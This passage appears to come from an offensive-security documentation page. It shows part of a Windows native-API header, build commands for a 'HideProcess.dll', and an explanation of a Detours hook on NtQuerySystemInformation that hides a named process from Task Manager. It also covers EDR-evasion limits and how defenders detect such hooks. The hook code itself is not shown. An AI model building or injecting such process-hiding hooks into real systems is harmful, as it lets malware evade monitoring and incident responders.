        SystemProcessorFeaturesInformation,                     // q: SYSTEM_PROCESSOR_FEATURES_INFORMATION
        SystemRegistryReconciliationInformation,                // s: NULL (requires admin) (flushes registry hives)
        SystemEdidInformation,                                  // q: SYSTEM_EDID_INFORMATION
        SystemManufacturingInformation,                         // q: SYSTEM_MANUFACTURING_INFORMATION // since THRESHOLD
        SystemEnergyEstimationConfigInformation,                // q: SYSTEM_ENERGY_ESTIMATION_CONFIG_INFORMATION
        SystemHypervisorDetailInformation,                      // q: SYSTEM_HYPERVISOR_DETAIL_INFORMATION
        SystemProcessorCycleStatsInformation,                   // q: SYSTEM_PROCESSOR_CYCLE_STATS_INFORMATION (EX in: USHORT ProcessorGroup) // NtQuerySystemInformationEx // 160
        SystemVmGenerationCountInformation,                     // s: PHYSICAL_ADDRESS (kernel-mode only) (vmgencounter.sys)
        SystemTrustedPlatformModuleInformation,                 // q: SYSTEM_TPM_INFORMATION
        SystemKernelDebuggerFlags,                              // q: SYSTEM_KERNEL_DEBUGGER_FLAGS
        SystemCodeIntegrityPolicyInformation,                   // qs: SYSTEM_CODEINTEGRITY_POLICY_INFORMATION
        SystemIsolatedUserModeInformation,                      // q: SYSTEM_ISOLATED_USER_MODE_INFORMATION
        SystemHardwareSecurityTestInterfaceResultsInformation,  // q: SYSTEM_HARDWARE_SECURITY_TEST_INTERFACE_RESULTS_INFORMATION
        SystemSingleModuleInformation,                          // q: SYSTEM_SINGLE_MODULE_INFORMATION
        SystemAllowedCpuSetsInformation,                        // s: SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION
        SystemVsmProtectionInformation,                         // q: SYSTEM_VSM_PROTECTION_INFORMATION (previously SystemDmaProtectionInformation)
        SystemInterruptCpuSetsInformation,                      // q: SYSTEM_INTERRUPT_CPU_SET_INFORMATION // 170
        SystemSecureBootPolicyFullInformation,                  // q: SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION
        SystemCodeIntegrityPolicyFullInformation,               // q: SYSTEM_CODE_INTEGRITY_POLICY_FULL_INFORMATION
        SystemAffinitizedInterruptProcessorInformation,         // q: KAFFINITY_EX // (requires SeIncreaseBasePriorityPrivilege)
        SystemRootSiloInformation,                              // q: SYSTEM_ROOT_SILO_INFORMATION
        SystemCpuSetInformation,                                // q: SYSTEM_CPU_SET_INFORMATION // since THRESHOLD2
        SystemCpuSetTagInformation,                             // q: SYSTEM_CPU_SET_TAG_INFORMATION
        SystemWin32WerStartCallout,                             // s: SYSTEM_WIN32_WER_START_CALLOUT (optional; 0-length uses current process)
        SystemSecureKernelProfileInformation,                   // q: SYSTEM_SECURE_KERNEL_HYPERGUARD_PROFILE_INFORMATION
        SystemCodeIntegrityPlatformManifestInformation,         // q: SYSTEM_SECUREBOOT_PLATFORM_MANIFEST_INFORMATION // NtQuerySystemInformationEx // since REDSTONE
        SystemInterruptSteeringInformation,                     // q: in: SYSTEM_INTERRUPT_STEERING_INFORMATION_INPUT, out: SYSTEM_INTERRUPT_STEERING_INFORMATION_OUTPUT // NtQuerySystemInformationEx // 180
        SystemSupportedProcessorArchitectures,                  // p: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx
        SystemMemoryUsageInformation,                           // q: SYSTEM_MEMORY_USAGE_INFORMATION
        SystemCodeIntegrityCertificateInformation,              // q: SYSTEM_CODEINTEGRITY_CERTIFICATE_INFORMATION
        SystemPhysicalMemoryInformation,                        // q: SYSTEM_PHYSICAL_MEMORY_INFORMATION // since REDSTONE2
        SystemControlFlowTransition,                            // qs: SYSTEM_CONTROL_FLOW_TRANSITION // operation-tagged Warbird control-flow transition request
        SystemKernelDebuggingAllowed,                           // s: ULONG
        SystemActivityModerationExeState,                       // s: SYSTEM_ACTIVITY_MODERATION_EXE_STATE
        SystemActivityModerationUserSettings,                   // q: SYSTEM_ACTIVITY_MODERATION_USER_SETTINGS
        SystemCodeIntegrityPoliciesFullInformation,             // qs: SYSTEM_CODE_INTEGRITY_POLICIES_FULL_INFORMATION // NtQuerySystemInformationEx
        SystemCodeIntegrityUnlockInformation,                   // q: SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION // 190
        SystemIntegrityQuotaInformation,                        // s: SYSTEM_INTEGRITY_QUOTA_INFORMATION (requires SeDebugPrivilege)
        SystemFlushInformation,                                 // q: SYSTEM_FLUSH_INFORMATION
        SystemProcessorIdleMaskInformation,                     // q: ULONG_PTR[ActiveGroupCount] // since REDSTONE3
        SystemSecureDumpEncryptionInformation,                  // qs: SYSTEM_SECURE_DUMP_ENCRYPTION_INFORMATION // NtQuerySystemInformationEx // opaque dump-key transform buffer (q: requires SeDebugPrivilege) (s: 0-length only, requires SeTcbPrivilege)
        SystemWriteConstraintInformation,                       // q: SYSTEM_WRITE_CONSTRAINT_INFORMATION
        SystemKernelVaShadowInformation,                        // q: SYSTEM_KERNEL_VA_SHADOW_INFORMATION
        SystemHypervisorSharedPageInformation,                  // q: SYSTEM_HYPERVISOR_SHARED_PAGE_INFORMATION // since REDSTONE4
        SystemFirmwareBootPerformanceInformation,               // q: SYSTEM_FIRMWARE_BOOT_PERFORMANCE_INFORMATION // HaliQuerySystemInformation -> HalpFwBootPerformanceTable, info class 34
        SystemCodeIntegrityVerificationInformation,             // q: SYSTEM_CODEINTEGRITY_VERIFICATION_INFORMATION
        SystemFirmwarePartitionInformation,                     // q: SYSTEM_FIRMWARE_PARTITION_INFORMATION // 200
        SystemSpeculationControlInformation,                    // q: SYSTEM_SPECULATION_CONTROL_INFORMATION // (CVE-2017-5715) REDSTONE3 and above.
        SystemDmaGuardPolicyInformation,                        // q: SYSTEM_DMA_GUARD_POLICY_INFORMATION
        SystemEnclaveLaunchControlInformation,                  // q: SYSTEM_ENCLAVE_LAUNCH_CONTROL_INFORMATION
        SystemWorkloadAllowedCpuSetsInformation,                // q: SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION // since REDSTONE5
        SystemCodeIntegrityUnlockModeInformation,               // q: SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION
        SystemLeapSecondInformation,                            // qs: SYSTEM_LEAP_SECOND_INFORMATION // (s: requires SeSystemtimePrivilege)
        SystemFlags2Information,                                // q: SYSTEM_FLAGS_INFORMATION // (s: requires SeDebugPrivilege)
        SystemSecurityModelInformation,                         // q: SYSTEM_SECURITY_MODEL_INFORMATION // since 19H1
        SystemCodeIntegritySyntheticCacheInformation,           // qs: NtQuerySystemInformationEx
        SystemFeatureConfigurationInformation,                  // q: in: SYSTEM_FEATURE_CONFIGURATION_QUERY, out: SYSTEM_FEATURE_CONFIGURATION_INFORMATION; s: SYSTEM_FEATURE_CONFIGURATION_UPDATE // NtQuerySystemInformationEx // since 20H1 // 210
        SystemFeatureConfigurationSectionInformation,           // q: in: SYSTEM_FEATURE_CONFIGURATION_SECTIONS_REQUEST, out: SYSTEM_FEATURE_CONFIGURATION_SECTIONS_INFORMATION // NtQuerySystemInformationEx
        SystemFeatureUsageSubscriptionInformation,              // q: SYSTEM_FEATURE_USAGE_SUBSCRIPTION_DETAILS; s: SYSTEM_FEATURE_USAGE_SUBSCRIPTION_UPDATE
        SystemSecureSpeculationControlInformation,              // q: SECURE_SPECULATION_CONTROL_INFORMATION
        SystemSpacesBootInformation,                            // q: SYSTEM_SPACES_BOOT_INFORMATION // variable-length opaque blob copied from ExpSpacesBootInformation (kernel mode only) // since 20H2
        SystemFwRamdiskInformation,                             // q: SYSTEM_FIRMWARE_RAMDISK_INFORMATION
        SystemWheaIpmiHardwareInformation,                      // q: SYSTEM_WHEA_IPMI_HARDWARE_INFORMATION
        SystemDifSetRuleClassInformation,                       // s: SYSTEM_DIF_VOLATILE_INFORMATION (requires SeDebugPrivilege)
        SystemDifClearRuleClassInformation,                     // s: NULL (requires SeDebugPrivilege)
        SystemDifApplyPluginVerificationOnDriver,               // q: SYSTEM_DIF_PLUGIN_DRIVER_INFORMATION (requires SeDebugPrivilege)
        SystemDifRemovePluginVerificationOnDriver,              // q: SYSTEM_DIF_PLUGIN_DRIVER_INFORMATION (requires SeDebugPrivilege) // 220
        SystemShadowStackInformation,                           // q: SYSTEM_SHADOW_STACK_INFORMATION
        SystemBuildVersionInformation,                          // q: in: SYSTEM_BUILD_VERSION_INFORMATION_INPUT, out: SYSTEM_BUILD_VERSION_INFORMATION // NtQuerySystemInformationEx // CmQueryBuildVersionInformation
        SystemPoolLimitInformation,                             // q: SYSTEM_POOL_LIMIT_INFORMATION (requires SeIncreaseQuotaPrivilege) // NtQuerySystemInformationEx
        SystemCodeIntegrityAddDynamicStore,                     // q: SYSTEM_CODE_INTEGRITY_DYNAMIC_STORE // CodeIntegrity-AllowConfigurablePolicy-CustomKernelSigners
        SystemCodeIntegrityClearDynamicStores,                  // q: SYSTEM_CODE_INTEGRITY_DYNAMIC_STORE // CodeIntegrity-AllowConfigurablePolicy-CustomKernelSigners
        SystemDifPoolTrackingInformation,                       // s: SYSTEM_DIF_POOL_TRACKING_INFORMATION (requires SeDebugPrivilege)
        SystemPoolZeroingInformation,                           // q: SYSTEM_POOL_ZEROING_INFORMATION
        SystemDpcWatchdogInformation,                           // qs: SYSTEM_DPC_WATCHDOG_CONFIGURATION_INFORMATION
        SystemDpcWatchdogInformation2,                          // qs: SYSTEM_DPC_WATCHDOG_CONFIGURATION_INFORMATION_V2
        SystemSupportedProcessorArchitectures2,                 // q: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx // 230
        SystemSingleProcessorRelationshipInformation,           // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX // (EX in: PROCESSOR_NUMBER Processor) // NtQuerySystemInformationEx
        SystemXfgCheckFailureInformation,                       // q: SYSTEM_XFG_FAILURE_INFORMATION
        SystemIommuStateInformation,                            // q: SYSTEM_IOMMU_STATE_INFORMATION // since 22H1
        SystemHypervisorMinrootInformation,                     // q: SYSTEM_HYPERVISOR_MINROOT_INFORMATION
        SystemHypervisorBootPagesInformation,                   // q: SYSTEM_HYPERVISOR_BOOT_PAGES_INFORMATION
        SystemPointerAuthInformation,                           // q: SYSTEM_POINTER_AUTH_INFORMATION
        SystemSecureKernelDebuggerInformation,                  // q: in: SYSTEM_SECURE_KERNEL_DEBUGGER_INFORMATION_INPUT, out: SYSTEM_SECURE_KERNEL_DEBUGGER_INFORMATION // NtQuerySystemInformationEx // kernel mode only
        SystemOriginalImageFeatureInformation,                  // q: in: SYSTEM_ORIGINAL_IMAGE_FEATURE_INFORMATION_INPUT, out: SYSTEM_ORIGINAL_IMAGE_FEATURE_INFORMATION_OUTPUT // NtQuerySystemInformationEx
        SystemMemoryNumaInformation,                            // q: SYSTEM_MEMORY_NUMA_INFORMATION_INPUT, SYSTEM_MEMORY_NUMA_INFORMATION_OUTPUT // NtQuerySystemInformationEx
        SystemMemoryNumaPerformanceInformation,                 // q: SYSTEM_MEMORY_NUMA_PERFORMANCE_INFORMATION_INPUT, SYSTEM_MEMORY_NUMA_PERFORMANCE_INFORMATION_OUTPUT // since 24H2 // 240
        SystemCodeIntegritySignedPoliciesFullInformation,       // qs: SYSTEM_CODE_INTEGRITY_SIGNED_POLICIES // NtQuerySystemInformationEx
        SystemSecureCoreInformation,                            // qs: SYSTEM_SECURE_CORE_INFORMATION // SystemSecureSecretsInformation
        SystemTrustedAppsRuntimeInformation,                    // q: SYSTEM_TRUSTEDAPPS_RUNTIME_INFORMATION
        SystemBadPageInformationEx,                             // q: SYSTEM_BAD_PAGE_INFORMATION[] (includes Pending and Poisoned)
        SystemResourceDeadlockTimeout,                          // q: ULONG
        SystemBreakOnContextUnwindFailureInformation,           // q: ULONG (requires SeDebugPrivilege)
        SystemOslRamdiskInformation,                            // q: SYSTEM_OSL_RAMDISK_INFORMATION
        SystemCodeIntegrityPolicyManagementInformation,         // q: SYSTEM_CODEINTEGRITY_POLICY_MANAGEMENT // since 25H2
        SystemMemoryNumaCacheInformation,                       // q: SYSTEM_MEMORY_NUMA_CACHE_INFORMATION
        SystemProcessorFeaturesBitMapInformation,               // q: ULONG64[2] // RTL_BITMAP_EX // RtlInitializeBitMapEx // 250
        SystemRefTraceInformationEx,                            // q: SYSTEM_REF_TRACE_INFORMATION_EX
        SystemBasicProcessInformation,                          // q: SYSTEM_BASICPROCESS_INFORMATION
        SystemHandleCountInformation,                           // q: SYSTEM_HANDLECOUNT_INFORMATION
        SystemRuntimeAttestationReport,                         // q: in: SYSTEM_RUNTIME_REPORT_INPUT (48 bytes on x64), out: report package // NtQuerySystemInformationEx
        SystemPoolTagInformation2,                              // q: SYSTEM_POOLTAG_INFORMATION2 // since 26H1
        MaxSystemInfoClass
    } SYSTEM_INFORMATION_CLASS;


    // Native Function

    extern "C" {

        NTSTATUS NTAPI NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            PVOID                    SystemInformation,
            ULONG                    SystemInformationLength,
            PULONG                   ReturnLength
        );

    }
    // Compile-time ABI checks for the intended x64 target.
    static_assert(sizeof(UNICODE_STRING) == 0x10, "UNICODE_STRING layout mismatch");
    static_assert(sizeof(CLIENT_ID) == 0x10, "CLIENT_ID layout mismatch");
    static_assert(sizeof(SYSTEM_THREAD_INFORMATION) == 0x50, "SYSTEM_THREAD_INFORMATION layout mismatch");
    static_assert(offsetof(SYSTEM_PROCESS_INFORMATION, Threads) == 0x100,
        "SYSTEM_PROCESS_INFORMATION layout mismatch");
    static_assert(offsetof(SYSTEM_BASICPROCESS_INFORMATION, ImageName) == 0x20,
        "SYSTEM_BASICPROCESS_INFORMATION layout mismatch");
    ```
  </Tab>
</Tabs>

## Compilation Instructions

This code uses Microsoft Detours for inline hooking. Ensure you have the Detours library installed at `C:\Detours\` (or modify the include paths in the code). It must be compiled as a DLL.

<Tabs>
  <Tab title="MSVC (cl.exe)">
    ```bash
    cl.exe /nologo /Ox /MT /W0 /GS- /LD /Tp main.cpp /link /OUT:HideProcess.dll /SUBSYSTEM:WINDOWS
    ```
    <Note title="Detours Linking">
      The `#pragma comment(lib, "C:\\Detours\\detours.lib")` directive in the code automatically links the Detours library. Ensure the paths in `#include "C:\Detours\detours.h"` match your installation.
    </Note>
  </Tab>
</Tabs>

## How It Works

1. **Microsoft Detours Initialization**
   In `DllMain` (`DLL_PROCESS_ATTACH`), the `HOOK()` function is called. It uses `DetourTransactionBegin`, `DetourAttach`, and `DetourTransactionCommit` to overwrite the first few bytes of `ntdll!NtQuerySystemInformation` with a jump instruction to `HNtQuerySystemInformation`.

2. **The Hook Function**
   When the host process (e.g., Task Manager) calls `NtQuerySystemInformation`, execution jumps to `HNtQuerySystemInformation`. This function first calls the original `ONtQuerySystemInformation` to ensure the kernel properly fills the buffer with the process list.

3. **Linked List Parsing**
   The buffer returned by the kernel is a singly-linked list of `SYSTEM_PROCESS_INFORMATION` structures. The code iterates through this list using the `NextEntryOffset` field.

4. **Process Unlinking (Hiding)**
   When the code finds a process whose `ImageName` matches `Notepad.exe` (using `CompareStringOrdinal`), it modifies the `NextEntryOffset` of the **previous** process in the list. By adding the target's `NextEntryOffset` to the previous entry, the previous entry now points directly to the entry *after* the target. The target process is effectively skipped over and becomes invisible.

## OpSec & Limitations

<Expandable title="Why this is a Userland technique and its limits">
- **Scope:** This hook only affects the process it is injected into. If you inject this DLL into `taskmgr.exe`, only Task Manager will be blinded. Process Explorer, `Get-Process` in PowerShell, or EDRs will still see the hidden process unless the DLL is injected into them as well.
- **EDR Bypass:** Modern EDRs do not rely solely on `NtQuerySystemInformation` in userland. They use Kernel callbacks (`PsSetCreateProcessNotifyRoutine`) which cannot be fooled by userland hooking.
- **Detection:** EDRs detect inline hooks by checking the first bytes of `ntdll` functions for unexpected `JMP` instructions (Memory scanning). If a hook is detected, the EDR will alert on it.
</Expandable>

<Callout type="warning" title="Prevention & Detection">
Defensive tools can detect this activity by:
- **Memory Integrity:** Scanning `ntdll.dll` in memory and comparing it against the clean on-disk version. Any discrepancies (like a JMP instruction) indicate userland hooking.
- **Hardware-assisted Hooking:** EDRs can use Intel CET or hardware breakpoints to catch hooks.
- **Kernel-mode Enumeration:** Security tools should enumerate processes from Kernel mode using `ZwQuerySystemInformation`, which bypasses userland hooks entirely.
</Callout>